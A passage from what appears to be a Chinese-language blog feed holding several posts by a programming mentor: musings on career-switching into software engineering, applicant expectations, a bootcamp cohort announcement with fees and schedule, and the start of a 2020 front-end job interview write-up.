        <content type="html"><![CDATA[<p><img src="/img/to-be-an-engineer-c20c962d44cf/0__UnEszfJtbsR0dzWt.jpg"></p><p>又是一篇收到了一大堆報名信以後的心得。</p><p>這次的樣本數變多了（接近兩百封），觀察到的個案也增加了。在這次的報名信裡面，很多人是因為看到各種轉職成功的文章，因而對程式有了興趣，覺得轉職成軟體工程師是一個不錯的選擇，然後才來報名這個課程。</p><p>然後有很多人希望以後能夠遠端工作，過著時間上比較自由的生活，或者是當個 Digital nomad，一邊工作一邊到處旅遊之類的。</p><p>我沒有說這樣不好，也沒有說你做不到，但我覺得在看一件事情時，如果被大量的、朝某一個方向傾斜的資訊給淹沒了，比較難看到事情的全面，也會讓你對這件事情產生一個可能沒有那麼正確的認知。</p><p>這是什麼意思呢？</p><p>當初讓你產生興趣的那些文章，你有沒有覺得每篇都很吸引人？許多都是從各行各業，看似跟程式沒什麼關係的背景然後轉職成工程師，上下班時間比較彈性，薪水也不錯，甚至還有出國工作或者是進知名大公司的人。</p><p>沒錯，非常吸引人，每一篇都很吸引人。接著過一段時間你或許會發現，咦，怎麼好像想要學程式轉職工程師的人這麼多，可是看到的案例都是那幾篇。</p><p>問題來了：</p><blockquote><p>那其他人去哪裡了？現在在做什麼？</p></blockquote><p>我不知道，你也不知道，很多商業導向的培訓班也不會讓你知道。因為對外放出的成功案例的目的之一就是吸引大家去消費，所以當然只會放吸引人的。其他那些學程式學一學發現沒那麼簡單就默默淡出，或者是學完以後發現轉職成工程師沒有那麼美好的人呢？不，他們不會出現在那些文章上。</p><p>這就像是什麼，像是開飲料店。</p><p>以前看到藝人開飲料店，現在網紅也開飲料店，每隔一段時間就有新的飲料店出現，不免會產生：「哇，開飲料店好像很好賺」的想法。但仔細想了一下，我有看到倒掉的飲料店嗎？有，而且不少。那如果真的很好賺，那些倒掉的是發生了什麼事？</p><p>我只看到飲料店一家一家開，卻選擇性地忽略了飲料店也是一家一家倒這件事情。其實開飲料店（或其實做任何事）都沒有想像中的容易，很多時候你以為容易，是因為你接收到、看到的都是成功的案例，少看了很多失敗的。</p><p>我覺得目前軟體工程師就是這樣，太多太多轉職成功的文章了。</p><p>好，這邊先假設你最後轉職成功了，找到了一份軟體工程師的工作，那大概會過著怎麼樣的生活？進去怎樣的公司？薪水大概是多少？</p><p>先假設你沒有任何程式相關背景，沒有任何顯著的學歷，程式也寫得普普通通，沒有特別好。可以參考一下這篇被很多人轉過的文章：<a href="https://forum.gamer.com.tw/C.php?bsn=60076&snA=5444020">【密技】台灣軟體業業界現況詳解、軟體工程師指南</a>。</p><p>以裡面對公司的區分來說，你去到的很有可能是「傳統大公司」、「做不太起來的新創、假新創、很小的新創」或者是「其他小資型小公司」。</p><p>可能上下班也不彈性，偶爾還需要加班，然後工作內容也滿亂的，搞不好沒有設計師也沒有 PM，你要一個人負責所有的需求，code 也一團糟，甚至沒有工程師同事可以一起討論。</p><p>薪水的部分，月薪大概 35k~42k 左右，我也不知道這樣的薪水範圍算是好還不好，但根據我以往的觀察，差不多就是這個範圍。</p><p>然後如果你有相關背景、學歷或是雖然沒基礎但是是天生武學奇才，寫程式寫得很猛，那薪水當然有可能再上去，就算是非本科轉職，到月薪 60k 也都有可能，但那真的要滿厲害才做得到。</p><p>再來我們談談遠端工作，好像滿多人都嚮往這種生活。</p><p>我以前也曾經嚮往過，直到我發現自己不適合。</p><p>喜歡是一件事，適不適合又是另外一件，如果兩個答案都是正向的，那當然很好，但只要有一個不是就沒辦法。你只想過自己喜歡遠端工作，有想過自己適合遠端工作嗎？有想過遠端工作需要具備什麼能力嗎？還是你只是看到那些遠端工作的文章覺得這樣好棒，其他什麼都沒有想？</p><p>建議可以看看這兩篇：<a href="https://medium.com/remote-taiwan/%E6%83%B3%E8%A6%81%E9%81%A0%E8%B7%9D%E5%B7%A5%E4%BD%9C-%E4%BD%A0%E6%BA%96%E5%82%99%E5%A5%BD%E4%BA%86%E5%97%8E-%E4%B8%8A-%E8%B6%85%E8%A1%9D%E6%93%8A%E7%9A%84%E4%BA%94%E5%A4%A7%E9%9B%A3%E9%97%9C-8e6cb9096b86">想要遠距工作，你準備好了嗎?(上) | 超衝擊的五大難關</a>、<a href="https://medium.com/remote-taiwan/%E5%9C%A8-ticketsolve-%E8%B7%A8%E6%99%82%E5%8D%80-remote-%E4%B8%80%E5%B9%B4%E5%A4%9A%E7%9A%84%E5%BF%83%E5%BE%97-30eee7a08e52">在 Ticketsolve 跨時區 Remote 一年多的心得</a>，你可能會發現遠端工作跟你想像中的不一樣。</p><p>再來，我覺得遠端工作對專業能力的需求，比在辦公室工作還來得高。為什麼？因為遠端工作：</p><ol><li>很吃溝通能力</li><li>需要能獨立作業</li></ol><p>在辦公室工作，你可以當個助理工程師，碰到自己解不開的問題就去問 mentor 或是其他同事，反正就坐附近而已，問問題很快。碰到不了解的地方也可以直接當面找人溝通，講不清楚就比手畫腳或是畫圖。</p><p>但是遠端工作呢？有可能大家習慣的工作時間或是時區不一樣，你沒辦法及時找到同事，要溝通的時候可能也是以文字為主。更別說如果你是那種私訊只會傳一句：「在嗎？」的人，雖然用的是非同步的工具，腦中卻還是想著要同步來溝通訊息。</p><p>還有一點是我覺得最難的，就是遠端工作很吃自制力。</p><p>如果哪天我真的要遠端工作，我一定還是會出門，找一個 co-working space 之類的，因為我沒辦法在家工作。這就跟以前念書考試一樣，有些人可以在家裡準備大考，拒絕電視、電腦跟床的誘惑，但有些人就是不行，只好去補習班或者是 K 書中心，換了一個環境才會有想要讀書的念頭。</p><p>再來是出國工作，我也不認為這是短期可以達到的事。</p><p>公司請一個外國人，需要幫你申請工作簽證，耗時又耗錢，你必須要有那個價值才行。如果你能力不足，只是一個普通的工程師，那為什麼他們不請當地的工程師就好，要花額外的心力來聘你？（這邊補充一下，如果簽證（身份）不是問題的話，在國外工作應該容易許多）</p><p>所以我都會跟我學生說，如果你想去國外工作，在台灣工作個兩三年以上再去挑戰，會更有機會一點。至少你有工作經驗，也不是剛進這個行業的新鮮人了。</p><p>總結一下，我這篇文章不是在告訴你「你一定做不到」，我不會這樣跟任何一個人講。相反地，我相信轉職軟體工程師是可以做得到的。</p><p>我只是想提醒一些你在看那些光鮮亮麗的文章時沒有想到的部分。我怕有些人看了一大堆內容農場轉職文以後覺得「哇感覺好像很簡單，人人都可以轉職」，但實際學了之後發現不是這樣，怎麼進度跟不上，程式碼看不懂。</p><p>期望越大，失望也越大，如果一開始就因為偏頗的認知訂下一些比實際困難的目標，說不定在做不到的時候會被期望反噬。但其實不是你做得不好，不是你不夠努力，是目標本來就比你想像中的還要遠。</p><p>舉例來說，遠端工作或是出國工作就可以訂在中長期目標，短期目標是轉職為軟體工程師。或如果想要再把目標切小一點，寫出一個網頁也可以是個短期目標。</p><p>其實比起訂目標，我覺得更重要的是去思考以下幾個問題：</p><ol><li>在學習寫程式的時候，你真的喜歡這件事情嗎？想要投入在這個技能上，用它來找工作嗎？</li><li>如果學完程式之後找到的工作是我剛講的那樣，薪水 35k~42k，工作內容不特別，沒有什麼同事可以一起討論，要做的事情很多，那你還想要轉職成工程師嗎？</li><li>如果你發現你所想像的出國工作以及遠端工作都沒有那麼容易，可能需要三四年或更久才能達到，你還想做這件事嗎？</li></ol><p>然後強調一件事情，「認清現況」跟「訂定目標」可以是兩回事。在我講這麼多之後，你可以認同我說的「無經驗學歷，程式能力普通出來找工作可能就是這樣」，但也可以把目標訂成「不管，我要付出雙倍的努力雙倍的武力，我就是一年後就要去國外工作，然後年薪百萬」。</p><p>我只是把我所認知的現況寫在這篇文章，自己的目標該怎麼訂，到底想不想轉職成工程師，這些都是你自己要思考的事情。</p><p>話說我前面寫了這麼多，是想要告訴你轉職軟體工程師很困難嗎？不是，我只是告訴你說轉職成功以後會擁有的生活，可能沒有你想像中的美好。但是轉職工程師這件事情，或許比你想的簡單，也或許比你想得難（完了我好像在說廢話，但這的確要看你對轉職的想像為何）。</p><p>我前陣子其實有思考過一個問題：</p><blockquote><p>從什麼時候開始，我認為轉職工程師這件事情沒那麼困難？</p></blockquote><p>因為對小時候的我來說，並不是這樣的。雖然說從很久以前就開始寫程式，但一直認為自己離「把寫程式當工作」還有一段距離，還有更多更多東西需要學習。到了大概大學順利找到實習，然後在公司裡面也混得不錯，才覺得自己要成為工程師沒什麼問題。</p><p>可是前陣子再想了一次這個問題，發現自己目前的看法是：「只要你願意拿出時間，對程式有興趣願意學習，半年我就可以讓你從零成為工程師」，不一定每個人都可以，但至少有人可以，至少我相信這件事情是辦得到的，而且我也看過以及親手教過做得到的人。</p><p>思考了一下原因，或許跟不知道從什麼時候就開始冒出來的一堆工程師培訓班有關。除了工程師以外，當然也有很多其他職業的培訓班，但我覺得軟體工程師不太一樣的原因在於課程不斷在進化，而且越來越完整。畢竟競爭激烈嘛，而且業界的技術本身就一直在進步，課程也要跟著演進才能跟上時代，沒有跟上的就會被淘汰。</p><p>然後工程師又是一個很開放而且資源很多的社群，網路上可以找到一堆問題的解答、好用的函式庫以及免費的教學，除了工程師，我還真的不知道哪個職業可以這麼輕易找到這麼多資源（可能部分的媒體吧，隨便抄個 PTT 就一篇報導了）。</p><p>工作機會多應該也是一個原因。未來我不知道，但以現況來說，你去 104 搜一下職缺就知道了，真的很多。而且儘管現在想轉工程師的人這麼多，職缺依然還是很多。</p><p>總之呢，我自己是認為無論是自學或是透過各種培訓班，要轉職成工程師都不是一件難事，是有機會可以做到的。</p><p>但也千萬別把這件事想得那麼容易。如果你以前曾有過自學而且非常努力的經驗（可能學日文啦，學設計啦，學行銷啦，學什麼都可以），那或許就不是那麼難。但如果你以前學什麼都三分鐘熱度，日文只會五十音、背英文單字只會 abandon，說要學很多東西但都還沒開始，那這其實不是「學程式」的問題，而是「學習」的問題了。</p><p>話說在這個「轉職工程師並不是那麼困難」的年代，其實有個問題值得大家思考。因為這種轉職的工程師變多了嘛，入行門檻變低，競爭變高，那轉職完以後，要如何繼續生存下去？要如何讓自己不會被淘汰？想不到也沒關係，<a href="/2020/02/04/its-okay-if-you-dont-have-goal-35363a8d8266/">沒有目標也沒有關係</a>，可以跟我一樣幾乎沒什麼規劃，歡迎加入隨波逐流聯盟。</p><p>最後來講講工程師的優點好了，以下幾點是我自己有感受到的：</p><ol><li>薪水（跟上面寫的一樣，對某些產業來說可能算是比較高的了）</li><li>移動力（無論到哪個國家或是哪間公司，都需要差不多的技能）</li><li>工作機會多（去 104 上面搜一大堆職缺，但雷的缺當然也很多）</li><li>升遷（基本上就是實力往上走，薪水就往上走）</li><li>生態圈（可以看到一堆免費資源、技術討論、社群以及技術文章）</li></ol><p>我不會覺得每個人都一定要變成工程師，但我的確認為寫程式是一個還不錯的技能，如果擁有的話會很棒。就算沒有想要當工程師，也可以去學個程式，有時候結合自己的領域會有出乎意料的效果。</p><p>喔對了，我這個人有時候比較喜歡冷門一點的東西，當一件事情變得太熱門的時候，對我來說就沒那麼酷了。所以在這個人人都想轉職工程師的年代，我幫自己訂下的中期目標是：「不要當工程師」。</p><p>我希望五年後的我不是個工程師（沒有在玩文字遊戲，所以也不會是什麼技術主管之類的）。至於會是什麼，我也不知道。</p><p>補充：</p><p>話說發完這篇文之後，突然想起來自己五年前就已經寫過有點類似的東西了：<a href="http://huli.logdown.com/posts/307966">那些「鹹魚翻身」的文章沒有告訴你的事</a>，那時候的用詞有種好稚嫩（？）的感覺，現在老ㄌ，社會化ㄌ</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最好的我，最好的你</title>
      <link href="/2020/05/24/best-e55cb3491b23/"/>
      <url>/2020/05/24/best-e55cb3491b23/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/best-e55cb3491b23/0__dvv8upUoSoxoW8UB.jpg"></p><p>最近程式導師實驗計畫第四期正在招生，在看報名信的時候有了一些心得，想說可以先記起來。</p><h3 id="最好的我"><a href="#最好的我" class="headerlink" title="最好的我"></a>最好的我</h3><p>有一些來報名的人之前有參與過我的其他線上課程，在信裡面會提到說之前在 Slack 上問問題時，我回答問題的速度很快，讓他們感到驚艷，課程也相對完整，因此才想來報名。</p><p>看到這一段的時候我想說：「喔不，誤會大了」</p><p>如同標題所說的，他們看到我的那時候，可以說是最好的我。因為我那時候沒上班，所以整天都閒閒沒事做，大部分時間都在網路上閒晃耍廢，反正我很閒。</p><p>訊息會回的很快有兩個原因，第一個原因是我剛好在線上，第二個原因是如果我看到通知，我會有兩個選擇：</p><ol><li>把通知留著</li><li>點開通知，可是一點開就要回覆訊息</li></ol><p>理由很簡單，因為如果通知不見我又沒有回，我會忘記有這件事…然後只要是我在家的時候大部分時間都在用電腦，所以看到就會直接順手回一下。</p><p>但現在不一樣了，我開始上班了，所以回訊息的速度會變慢，可能不會像以前那樣光速回覆。不過話雖如此，也不會慢到哪去啦，如果過兩三天還沒回那通常就是我忘記了。</p><p>另外課程部份，這次第四期的東西其實有很多是砍掉重練，所以課程其實還在準備，最理想的狀況是在開課前我就靠著壓力戰勝拖延症，把東西全都弄好，最差的狀況是拖延症打敗了我，就有些課程的東西可能後面才會陸續補，或是乾脆先暫時改成第一二期那樣的直播上課之類的，應該也會是另一種效果。</p><p>總之，還是希望自己能在計畫開始前把東西都搞定。</p><h3 id="最好的你"><a href="#最好的你" class="headerlink" title="最好的你"></a>最好的你</h3><p>從第一期到現在，應該看了兩百封以上的報名信了，有一天我在看這期的報名信時，突然有了一些想法。</p><p>那就是寫著報名信的你，也可能是最好的你，是你對未來充滿憧憬，還沒嘗試過但卻期待，同時也相信自己能達成目標的樣子。</p><p>「我一定要轉職成工程師」、「我一週可以付出 40 小時或是更多，我會很努力」、「我會全心投入在這個上面」…</p><p>想像很美好，現實很殘酷，等到計畫真的開始並且過一陣子以後，事情跟你想像的應該會很不一樣。</p><p>不過別誤會我的意思，第一，我沒有在唱衰的意思，我只是根據過往的經歷，跟大家說這件事情很有可能發生，第二，我也沒有在責怪的意思，因為我知道大家都寫報名信的當下，是真的覺得自己能夠做到。</p><p>這很正常啊，我也設定過很多目標，設定的當下想說：「我一定要做到」，結果最後面都不了了之。我每年立下的年度目標，幾乎沒一個成功過，所以後來就順理成章地不立了。</p><p>坦白說，我不希望來報名的人把這個計畫視為一個「人生的轉捩點」或是「改頭換面的一次機會」，因為這是一件高風險的事（當然也高報酬啦）。假如真的成功結業然後轉職了，那當然很好，但如果不幸沒有呢？</p><p>如果一件你一直視為是重要轉折點的事情，卻沒有達成這個效果，那後果你承受得住嗎？如果心理素質不夠強，搞不好就垮了。所以我比較喜歡大家來這個課程的心態是：「能夠結業當然很好，但就算沒有結業，我也還是會繼續在這條路上努力著，尋找其他資源來達成我當初訂下的目標。」</p><p>換句話說，你的目標是轉職成工程師（或是學好程式之類的），而不是「參與這個計畫」，這個計畫只是手段，不是目的，不要錯把手段當成目的了。</p><p>當然，你還是最了解你自己的人，所以要抱持著什麼心態來參加，或是要不要把這個計畫看成是你「最後一個機會」之類的，其實我也都管不著，我只是覺得心態上的調整滿重要的。</p><p>然後這些其實也不會太影響錄取與否啦，不會因為跟我想法差很多然後就被拒絕。話說講到這個錄取標準，下一期我一定要在報名簡章上直接寫說：「錄取標準不定，純憑個人喜好，沒辦法接受的人請斟酌要不要報名」</p><p>大概就是這樣吧，只是剛好看報名信看一看想把一些想法記錄下來。然後看到這些報名信，其實一方面是動力，另一方面也是壓力，這本來就是一體兩面的東西。</p><p>因為別人對你的期待（或是自己對自己的期待）而產生了壓力，但同時也是一種動力，讓自己能夠繼續前進。目前都跟這種動力處得還算不錯，希望能夠繼續保持。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計劃第四期開始報名囉！</title>
      <link href="/2020/05/01/lidemy-mentor-program-4th-39f58a00067c/"/>
      <url>/2020/05/01/lidemy-mentor-program-4th-39f58a00067c/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/lidemy-mentor-program-4th-39f58a00067c/0__XSsBHNBIe02MwNtz.png"></p><p>之前在<a href="/2020/02/02/i-failed-9386c6b0a681/">第三期的心得</a>裡面，已經預告了第四期的復活。</p><p>然後依照規劃好的時間軸，今天，也就是 5&#x2F;1，程式導師實驗計畫第四期正式開放報名囉！</p><p>而且新期新氣象，這一期特地找了第三期的學生來做了程式導師實驗計畫的官網，你想知道的東西都寫在那裡了：<a href="https://bootcamp.lidemy.com/">Lidemy 程式導師實驗計畫第四期</a></p><p><strong>強烈建議大家可以點進去觀看，過往的資訊也都在裡面，內容也會比這篇文章豐富許多。</strong></p><p>這次會想要做網站，主要是因為這個計畫跑了三期之後累積了不少資源，例如說每一期的心得跟檢討啦，每一期的簡章啦，還有每一期學生的心得，其實都滿多東西的，而目前這些東西很分散，你沒辦法在一個地方就找到這些資源。</p><p>因此就想說來做個網站，可以把資源集中，要找東西的時候也會好找很多。</p><p>不過既然文章都寫了，我這篇文章還是簡單描述一下程式導師實驗計畫到底在幹嘛好了。可是底下只是稍微介紹而已，詳細的規則請參考<a href="https://bootcamp.lidemy.com/">官方網站</a>。</p><h3 id="計畫詳情"><a href="#計畫詳情" class="headerlink" title="計畫詳情"></a>計畫詳情</h3><p>這個計畫的目標是：</p><blockquote><p>六個月內，把你培養成一個找得到工作的網頁工程師（前端或後端）</p></blockquote><p>教的東西很多，想看課綱可以參考：<a href="https://bootcamp.lidemy.com/syllabus.html">簡化版的課綱</a>（適合外行人觀看）或是<a href="https://github.com/Lidemy/mentor-program-4th">詳細版課綱</a>（適合工程師觀看）。</p><p>雖然六個月看似很長但其實不然，這種高密集性的課程需要許多時間的投入。想要達成以上目標，我的建議是一週要能付出 30 小時以上的時間學習，所以對於那些想要兼職學習的人來說，這基本上辦不到。</p><p>可是別擔心，這並不代表你不能報名這個課程。</p><p>過往其實就有些案例是課程剛開始時兼職學習，等到<strong>兩個月試用期</strong>結束之後，確定自己對程式有興趣而且想要轉職，才辭掉工作專心投入，這樣也是完全 ok 的。</p><p>再來是這一期多了一個直接花錢買課程的付費方案，是給已經是工程師卻還是想加強基礎，或是需要兼顧工作，只能把學習時間拉長的人用的。所以就算你不想轉職，你只是想學個技能或因為其他原因想學習程式，也都有機會進來這個計畫。</p><h3 id="教學方式"><a href="#教學方式" class="headerlink" title="教學方式"></a>教學方式</h3><p>課程一共 26 週，前 24 週上課，最後 2 週做 final project，如果發現兩週做不完會再延長。進度的部分會按照 26 六周來切，每週都會有我錄好的線上課程影片還有作業，基本上就是看影片然後做作業，然後我或是助教會批改並且給予意見。進度主要是讓六個月後想轉職的人參考的，如果沒有想轉職，按照自己的步調來就行了。</p><p>有些週的課程可能不會有影片，就會提供一些參考資源或是讓大家自己找資料，培養查資料的能力。我也會不定期開直播幫大家解惑，有什麼疑難雜症都可以提問。</p><p>課程會有一個學生專屬的學習系統，每天都可以看見其他同學做了什麼，讓你學習起來不孤單。</p><p>如果你覺得只看課程影片就好了，可以自己跟著學，其他這些學習社群、導師、批改作業跟直播你都不太需要，那可以直接上 <a href="https://lidemy.com/">Lidemy</a> 購買課程並且搭配<a href="https://github.com/Lidemy/mentor-program-4th">課程大綱</a>來學習，或是也可以直接去 Udemy 買，或去看免費的開放式課程，這樣也很不錯，而且經濟上划算許多。</p><h3 id="收費方式"><a href="#收費方式" class="headerlink" title="收費方式"></a>收費方式</h3><p>這次分成兩個方案，「A 方案：求職方案」與「 B 方案：買斷方案」。</p><p>A 求職方案是這個計畫的亮點之一：</p><blockquote><p>在結業後兩個月內找到工作的話，學費總額是一個半月的薪水；沒找到工作的話費用全免。</p></blockquote><p>但想參與的人有條件限制，必須要：</p><ol><li>有求職意願，願意在結業後去找軟體工程師相關工作</li><li>一週要能付出 30 小時以上在這個計畫</li></ol><p>如果不符合以上條件，只能選擇 B 買斷方案，基本上就是花錢買課程，學費總額是 55000 元，第三個月開始每個月分期付款 12500 元，中途可以退出，後續的學費就不會再收。</p><p>然後我要再次強調一點，那就是我知道很多想轉職的人在金錢上可能不是那麼有餘裕，所以收費方式很彈性。</p><p>第一，被選進來的話前兩個月都免費上課，在兩個月後可以決定是否要留下，不留的話就珍重再見期待再相逢，要留的話就付 5000 元保證金。</p><p>第二，A 求職方案的學費會在你工作以後才分期付款，大家基本上都是分六期，一期一萬之類的。如果你經濟上有些問題，等試用期三個月過了以後再分期付款也可以，或想要分更多期都可以再討論。</p><p>第三，B 買斷方案第三個月開始每個月付一次錢，這樣經濟壓力應該不會這麼大，但因為仍然不是筆小數目，如果想要分更多期都可以再討論，真的很彈性。</p><p>我希望大家都是開心地繳學費，而且是真的認為這個課程有幫助所以付錢，因此才有了兩個月試用期、就業成功後才繳錢等等這些規則。</p><h3 id="跟上一期有哪些不同"><a href="#跟上一期有哪些不同" class="headerlink" title="跟上一期有哪些不同"></a>跟上一期有哪些不同</h3><ol><li>收費模式有了滿大的改動</li><li>作業以「漸進增強」的理念重新設計，取代零散小作業</li><li>作業完整度增加</li><li>新增助教制度，有助教會來幫忙改作業</li><li>引入產品以及開發流程相關課程</li></ol><h3 id="計畫時程表"><a href="#計畫時程表" class="headerlink" title="計畫時程表"></a>計畫時程表</h3><p>報名日期：即日起至 2020&#x2F;06&#x2F;05 晚上 11:59 分（五）<br>報名結果公告：2020&#x2F;06&#x2F;08（一）<br>開課日期：2020&#x2F;06&#x2F;12（五）<br>繳交保證金新台幣 5000 元（兩個月）：2020&#x2F;08&#x2F;12（三）<br>選擇「B 買斷方案」的同學開始分期付款：2020&#x2F;09&#x2F;12（六）<br>結業日期：2020&#x2F;12&#x2F;12（六）<br>求職截止日（在這時間點前找到工作都必須付學費）：2021&#x2F;02&#x2F;12（五）</p><h3 id="報名方式"><a href="#報名方式" class="headerlink" title="報名方式"></a>報名方式</h3><p>會需要你去 <a href="https://forms.gle/JqCqJHHyd7U2KHBv9">Google 表單</a>填寫一些基本資訊，然後去研究 Scratch 做一個小作品出來，接著自學一點程式，去 <a href="https://github.com/Lidemy/mentor-program/blob/master/codewar.md">codewar</a> 上面解出三題題目並且寫一下解題心得。</p><p>做完之後寫信到 <a href="mailto:&#x68;&#117;&#x6c;&#105;&#x40;&#108;&#105;&#100;&#101;&#109;&#121;&#46;&#x63;&#x6f;&#x6d;">&#x68;&#117;&#x6c;&#105;&#x40;&#108;&#105;&#100;&#101;&#109;&#121;&#46;&#x63;&#x6f;&#x6d;</a></p><p>標題請打：[報名] 程式導師實驗計畫第四期  — huli<br>（請把 huli 換成你自己的暱稱）</p><p>信件內容請附上：</p><ol><li>自我介紹（讓我更瞭解你）</li><li>報名這個計畫的理由</li><li>若成功錄取之後，你的時間安排為何（例如說目前待業，每天都有 8 小時可以寫程式；或是目前在職，但是晚上七點到十點會自學等等）</li><li>你未來想做什麼？（純粹好奇而已）</li><li>平時有寫東西的習慣嗎？（像是部落格、讀書心得、電影心得或者是旅遊日記都可以，有的話可以多談談這部分或附上網址，沒有的話也沒關係）</li><li>Scratch 作品連結 &amp; 做完 Scratch 作品的心得</li><li>Codewar 帳號 &amp;解 Codewar 題目的心得</li><li>任何你想跟我分享的東西（例如說你寫的小說、你畫的圖、你的一篇廢文等等。）</li><li>其他（其他任何你想補充的東西）</li></ol><p>更多資訊請參考：<a href="https://bootcamp.lidemy.com/course-info.html#anchor-registration">https://bootcamp.lidemy.com/course-info.html#anchor-registration</a></p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>我怕寫太多會跟官網內容太過於重複，內容又不想全部都複製貼上過來，因此以上都只是隨意介紹一下而已。</p><p>更多資訊在官網裡面都可以找到，例如說那時做官網的一大動力是過往的檢討文章連結跟學習成效，以前每發一次文就要貼一次然後一堆連結，現在終於有個地方可以看到全貌了！</p><p><img src="/img/lidemy-mentor-program-4th-39f58a00067c/1__PPNKt4NjYTs7GJGDKauafg.png"></p><p><a href="https://bootcamp.lidemy.com/achievement.html#anchor-experience">學生心得</a>也是，整理起來一目瞭然：</p><p><img src="/img/lidemy-mentor-program-4th-39f58a00067c/1__ajH9Vr9IVl2xiTclm4Prdg.png"></p><p>計畫介紹、課綱、導師介紹、報名方式、常見問題都在網站裡面寫清楚了，如果有碰到什麼問題都可以留言跟我說或是寄信給我。</p><p>最後，感謝這次網站的幕後功臣們： <a href="https://medium.com/u/1b8faea10a91">Yakim Hsu</a>, <a href="https://medium.com/u/c7713dd3b6f6">Min</a> 還有 <a href="https://chihyang41.github.io/">ChihYang</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 資深前端工程師面試心得（4y, 100k+）</title>
      <link href="/2020/04/28/2020-senior-front-end-engineer-interview-249c719c1a97/"/>
      <url>/2020/04/28/2020-senior-front-end-engineer-interview-249c719c1a97/</url>
      
        <content type="html"><![CDATA[<p>上次在台灣求職的時候是 2015 年 4 月，剛好是五年前的事，那時候的心得可以參考：<a href="https://www.ptt.cc/bbs/Soft_Job/M.1431190145.A.D28.html">[心得] 15家中小型公司、新創公司面試心得分享</a>。先來講一下這次求職的原因好了，原本其實是想做自己的事，想試試看把教學當成正職來經營，但一段時間之後失敗了，因為自己心態上還沒有辦法調整成這樣，於是白天就多了很多時間。</p><p>就在此時，剛好看到某間公司在找人，看了職缺以後滿心動的，於是就投履歷了。後來想說既然都投了，不如就開始找工作吧。這次求職是佛系求職，沒找到工作也沒差，沒有面到理想的職缺就繼續邊耍廢邊做教學。講完求職的背景以後，底下會先講這次求職的管道，然後會有每間公司的面試心得以及總結。</p><p>如果有人好奇問說：「怎麼沒有寫到求職前的準備？」，因為這次是佛系求職，所以沒有任何準備，看面試考古題或是刷題什麼的都沒有。</p><p>標題的 4y 指的是我有四年工作經驗，100k+ 指的是月薪要求十萬台幣以上，想說寫清楚會對背景更清楚一點。先把這篇會提到的公司寫出來，方便大家決定要不要繼續看：</p><ol><li>AmazingTalker</li><li>Hahow</li><li>Shopline</li><li>財報狗</li><li>浪 Live</li><li>優訊 Unistar</li><li>Shopback</li><li>OneDegree</li></ol><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>四年工作經驗，其中一年半在台灣，另外兩年半在新加坡，第一份之後都是專門找前端工程師的職位，擅長 React，對 Vue 以及 Angular 極度不熟，完全沒用過。</p><p>這次求職我有直接對外公開期望待遇，要同時符合以下兩點：</p><ol><li>月薪 10 萬新台幣以上</li><li>年薪 150 萬新台幣以上</li></ol><p>這是底線，沒有到這個數字的基本上不會考慮。在看求職網上的薪水範圍時，我都直接看範圍的上界，只要有到我就覺得可以試試看。</p><p>想找的是資深前端工程師的職位，但如果有前端 team leader 或是相關的管理職也不排斥。產業沒有特別喜歡的，但比較不喜歡的是區塊鏈相關的公司（個人喜好問題，就是對這塊沒什麼興趣）。</p><h3 id="求職管道"><a href="#求職管道" class="headerlink" title="求職管道"></a>求職管道</h3><p>104 跟 Yourator 完全沒有使用，Cakeresume 倒是有投了三間，除此之外，主要是在前端社群的 GitHub 貼了自己的履歷跟期望待遇，把正在求職的消息放出去：<a href="https://github.com/f2etw/jobs/issues/684">[求職][台北] 資深前端工程師</a></p><p><img src="/img/2020-senior-front-end-engineer-interview-249c719c1a97/1__Fy0YJEZPNSz0BRj6BOKknA.png"></p><p>當然，這個 GitHub 的 Issue 會主動注意的人不多，所以會放這邊主要是當作 cover letter 那樣的東西，簡單介紹一下自己，主戰場是其實 Linkedin，因此也有在自己的 Linkedin 上面發文（大概 800 個 connections）：</p><p><img src="/img/2020-senior-front-end-engineer-interview-249c719c1a97/1__YoEn4ZwDdJ6ORA8dVe0oMw.png"></p><p>Linkedin 的貼文有個比較好玩的資料可以看，可以看這些人都來自哪個公司、職位還有地區：</p><p><img src="/img/2020-senior-front-end-engineer-interview-249c719c1a97/1__9U1cmagEA__eGBwNlzDIQgw.png"></p><p>求職管道就這樣了，除了 Cakeresume 上主動投的三間，其他都是公司 HR 主動聯絡或者是獵人頭介紹的，還有一些是員工來推薦自己公司的職缺。</p><p>這次與獵人頭接觸的滿多，詳細心得可以參考：<a href="/2020/04/22/about-head-hunter-27fe1c28648f/">獵人頭觀察報告</a>。接下來就直接進入主題：面試心得。</p><p>如果一個面試有面到一輪以上（例如說工程師聊完就直接換 HR 聊，而不是額外再約下一次面試）我就會標明一面 Round1、一面 Round2 等等，若是只有一次面試，我就會直接寫 Round1、Round2。</p><h3 id="AmazingTalker"><a href="#AmazingTalker" class="headerlink" title="AmazingTalker"></a>AmazingTalker</h3><p>產品：線上家教媒合平台<br>管道：HR 主動聯絡<br>面試方式：Zoom</p><p>這就是我開頭說的那一間，原本沒有想找工作，看到這間職缺覺得不錯，薪資範圍也有到，所以就把履歷給 HR 了。</p><h4 id="一面：HR"><a href="#一面：HR" class="headerlink" title="一面：HR"></a>一面：HR</h4><p>主要就是跟 HR 聊聊天，自我介紹還有討論一下這個職位要做的事情之類的，面試前一天想說做個簡報自我介紹好像不錯，就稍微做了一下，介紹之前工作經驗還有其他像是教學以及部落格的專案。也有問了 HR 一些好奇的問題，例如說工程師有多少人以及公司目標之類的。</p><p>然後在這一關就被刷掉了，原因是對方說他們公司想找的人要能「把公司專案當成自己的創業項目」，需要那樣子的熱情，但對方覺得我做不太到（因為我還有自己的教學相關的副業要做）。</p><p>我也是真的做不到啦，而且我覺得我去哪一間公司都做不到，但我同時也認為就算做不到，也不會影響到我的工作表現。不過若是對方就是想找這樣的人，那就是我跟他們公司文化不太合，所以在第一關就結束也好。</p><h4 id="結果"><a 